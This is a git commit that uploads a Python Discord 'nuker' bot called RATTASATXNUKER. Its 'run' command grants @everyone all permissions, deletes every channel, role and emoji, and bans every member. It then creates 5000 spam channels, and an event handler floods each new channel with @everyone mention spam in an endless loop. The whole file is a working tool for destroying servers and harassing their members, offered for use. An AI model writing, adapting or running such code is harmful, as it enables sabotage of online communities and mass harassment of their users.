eac53534e44a450874b2152f1f607cdb276e317b
CoeyStepthep <goodplaceofficer8@gmail.com>
2025-01-24 18:26:21 +0700

    Add files via upload

---
+++ Botnukefree.py
@@ -0,0 +1,117 @@
+import discord
+from discord.ext import commands
+import random
+from discord import Permissions
+from colorama import Fore, Style
+import asyncio
+from pystyle import Colors,Colorate
+from colorama import Fore
+import requests
+from time import sleep
+import discord,os,json
+from json import load
+from discord.ext import commands
+import socket
+import random
+import threading
+from httpx import patch
+from time import sleep
+from colorama import Fore
+from pystyle import Colors, Colorate
+os.system(f'cls & mode 85,20 & title  RATTASATXNUKER')
+token = input(f"BOT TOKEN : ")
+
+SPAM_CHANNEL =  ["RATTASATXNUKER"]
+SPAM_MESSAGE = ["@everyone @here @everyone ⌚️ 📱 📲 💻 ⌨️ 🖥 🖨 🖱 🖲 🕹 🗜 💽 💾 💿 📀 📼 📷 📸 📹 🎥 📽 🎞 📞 ☎️ 📟 📠 📺 📻 🎙 🎚 🎛 🧭 ⏱ ⏲ ⏰ 🕰 ⌛️ ⏳ 📡 🔋 🪫 🔌 💡 🔦 🕯 🪔 🧯 🛢 💸 💵 💴 💶 💷 🪙 💰 💳 💎 ⚖️ 🪜 🧰 🪛 🔧 🔨 ⚒ 🛠 ⛏ 🪚 🔩 ⚙️ 🪤 🧱 ⛓ 🧲 🔫 💣 🧨 🪓 🔪 🗡 ⚔️ 🛡 🚬 ⚰️ 🪦 ⚱️ 🏺 🔮 📿 🧿 🪬 💈 ⚗️ 🔭 🔬 🕳 🩹 🩺 🩻 🩼 💊 💉 🩸 🧬 🦠 🧫 🧪 🌡 🧹 🪠 🧺 🧻 🚽 🚰 🚿 🛁 🛀 🧼 🪥 🪒 🧽 🪣 🧴 🛎 🔑 🗝 🚪 🪑 🛋 🛏 🛌 🧸 🪆 🖼 🪞 🪟 🛍 🛒 🎁 🎈 🎏 🎀 🪄 🪅 🎊 🎉 🪩 🎎 🏮 🎐 🧧 ✉️ 📩 📨 📧 💌 📥 📤 📦 🏷 🪧 📪 📫 📬 📭 📮 📯 📜 📃 📄 📑 🧾 📊 📈 📉 🗒 🗓 📆 📅 🗑 🪪 📇 🗃 🗳 🗄 📋 📁 📂 🗂 🗞 📰 📓 📔 📒 📕 📗 📘 📙 📚 📖 🔖 🧷 🔗 📎 🖇 📐 📏 🧮 📌 📍 ✂️ 🖊 🖋 ✒️ 🖌 🖍 📝 ✏️ 🔍 🔎 🔏 🔐 🔒 🔓❤️ 🧡 💛 💚 💙 💜 🖤 🤍 🤎 ❤️‍🔥 ❤️‍🩹 💔 ❣️ 💕 💞 💓 💗 💖 💘 💝 💟 ☮️ ✝️ ☪️ 🕉 ☸️ ✡️ 🔯 🕎 ☯️ ☦️ 🛐 ⛎ ♈️ ♉️ ♊️ ♋️ ♌️ ♍️ ♎️ ♏️ ♐️ ♑️ ♒️ ♓️ 🆔 ⚛️ 🉑 ☢️ ☣️ 📴 📳 🈶 🈚️ 🈸 🈺 🈷️ ✴️ 🆚 💮 🉐 ㊙️ ㊗️ 🈴 🈵 🈹 🈲 🅰️ 🅱️ 🆎 🆑 🅾️ 🆘 ❌ ⭕️ 🛑 ⛔️ 📛 🚫 💯 💢 ♨️ 🚷 🚯 🚳 🚱 🔞 📵 🚭 ❗️ ❕ ❓ ❔ ‼️ ⁉️ 🔅 🔆 〽️ ⚠️ 🚸 🔱 ⚜️ 🔰 ♻️ ✅ 🈯️ 💹 ❇️ ✳️ ❎ 🌐 💠 Ⓜ️ 🌀 💤 🏧 🚾 ♿️ 🅿️ 🛗 🈳 🈂️ 🛂 🛃 🛄 🛅 🚹 🚺 🚼 ⚧ 🚻 🚮 🎦 📶 🈁 🔣 ℹ️ 🔤 🔡 🔠 🆖 🆗 🆙 🆒 🆕 🆓 0️⃣ 1️⃣ 2️⃣ 3️⃣ 4️⃣ 5️⃣ 6️⃣ 7️⃣ 8️⃣ 9️⃣ 🔟 🔢 #️⃣ *️⃣ ⏏️ ▶️ ⏸ ⏯ ⏹ ⏺ ⏭ ⏮ ⏩😀 😃 😄 😁 😆 😅 😂 🤣 🥲 🥹 ☺️ 😊 😇 🙂 🙃 😉 😌 😍 🥰 😘 😗 😙 😚 😋 😛 😝 😜 🤪 🤨 🧐 🤓 😎 🥸 🤩 🥳 😏 😒 😞 😔 😟 😕 🙁 ☹️ 😣 😖 😫 😩 🥺 😢 😭 😮‍💨 😤 😠 😡 🤬 🤯 😳 🥵 🥶 😱 😨 😰 😥 😓 🫣 🤗 🫡 🤔 🫢 🤭 🤫 🤥 😶 😶‍🌫️ 😐 😑 😬 🫠 🙄 😯 😦 😧 😮 😲 🥱 😴 🤤 😪 😵 😵‍💫 🫥 🤐 🥴 🤢 🤮 🤧 😷"]
+
+client = commands.Bot(command_prefix="T")
+os.system(f'cls & mode 77,20 & title  MAKEBY: RATTASATX')
+
+@client.event
+async def on_ready():
+   print(Colorate.Horizontal(Colors.rainbow, """   
+         
+ 
+              ┏━━┓╋╋╋┏┓╋╋╋╋╋╋┏┓╋╋╋╋╋┏━┓
+              ┃┏┓┃╋╋┏┛┗┓╋╋╋╋╋┃┃╋╋╋╋╋┃┏┛
+              ┃┗┛┗┳━┻┓┏╋━┓┏┓┏┫┃┏┳━━┳┛┗┳━┳━━┳━━┓
+              ┃┏━┓┃┏┓┃┃┃┏┓┫┃┃┃┗┛┫┃━╋┓┏┫┏┫┃━┫┃━┫
+              ┃┗━┛┃┗┛┃┗┫┃┃┃┗┛┃┏┓┫┃━┫┃┃┃┃┃┃━┫┃━┫
+              ┗━━━┻━━┻━┻┛┗┻━━┻┛┗┻━━┛┗┛┗┛┗━━┻━━┛
+  
+    commandnukeserver [+]Trun            - WEBHOOKSPAMMER
+                                         - CREATE CHANNEL
+Link : https://discord.gg/w8BXM2G2BE     - DELETE CHANNEL
+                                         - DELETE ROLE
+                                         - BAN USER
+                                         - RANDOM LANGUAGE
+                                         - FAST SPAMMER
+                                            
+ 
+                                      """))                                   
+ 
+   await client.change_presence(activity=discord.Game(name="RATTASATXNUKER"))
+os.system(f'cls & mode 77,20 & title  RATTASATXNUKER')   
+@client.command()
+@commands.is_owner()
+async def stop(ctx):
+    await ctx.bot.logout()
+    print (Fore.LIGHTBLUE_EX + f"{client.user.name} LOGIN TO SUCCESSFULLY." + Fore.RESET)
+
+@client.command()
+async def run(ctx):
+    await ctx.message.delete()
+    guild = ctx.guild
+    try:
+      role = discord.utils.get(guild.roles, name = "@everyone")
+      await role.edit(permissions = Permissions.all())
+      print(Fore.LIGHTCYAN_EX + "RATTASATXNUKER" + Fore.RESET)
+    except:
+      print(Fore.LIGHTCYAN_EX + "RATTASATXNUKER" + Fore.RESET)
+    for channel in guild.channels:
+      try:
+        await channel.delete()
+        print(Fore.LIGHTMAGENTA_EX + f"{channel.name} " + Fore.RESET)
+      except:
+        print(Fore.LIGHTMAGENTA_EX + f"{channel.name} " + Fore.RESET)
+    for member in guild.members:
+     try:
+       await member.ban()
+       print(Fore.LIGHTBLUE_EX + f"{member.name}#{member.discriminator} " + Fore.RESET)
+     except:
+       print(Fore.LIGHTBLUE_EX + f"{member.name}#{member.discriminator} " + Fore.RESET)
+    for role in guild.roles:
+     try:
+       await role.delete()
+       print(Fore.LIGHTGREEN_EX + f"{role.name} " + Fore.RESET)
+     except:
+       print(Fore.LIGHTGREEN_EX + f"{role.name} " + Fore.RESET)
+    for emoji in list(ctx.guild.emojis):
+     try:
+       await emoji.delete()
+       print(Fore.MAGENTA + f"{emoji.name} " + Fore.RESET)
+     except:
+       print(Fore.LIGHTYELLOW_EX + f"{emoji.name} " + Fore.RESET)
+    banned_users = await guild.bans()
+    for ban_entry in banned_users:
+      user = ban_entry.user
+      try:
+        await user.unban("RATTASATX")
+        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} " + Fore.RESET)
+      except:
+        print(Fore.LIGHTYELLOW_EX + f"{user.name}#{user.discriminator} " + Fore.RESET)
+    await guild.create_text_channel("RATTASATXNUKESERVERYOU")
+    for channel in guild.text_channels:
+        link = await channel.create_invite(max_age = 0, max_uses = 0)
+        print(f"")
+    amount = 5000
+    for i in range(amount):
+       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
+    print(f"NUKE SERVER {guild.name} SUCCESSFULLY.")
+    return
+os.system(f'cls & mode 77,20 & title  RATTASATXNUKER ')
+@client.event
+async def on_guild_channel_create(channel):
+  while True:
+    await channel.send(random.choice(SPAM_MESSAGE))                                                   
+client.run(token, bot=True)
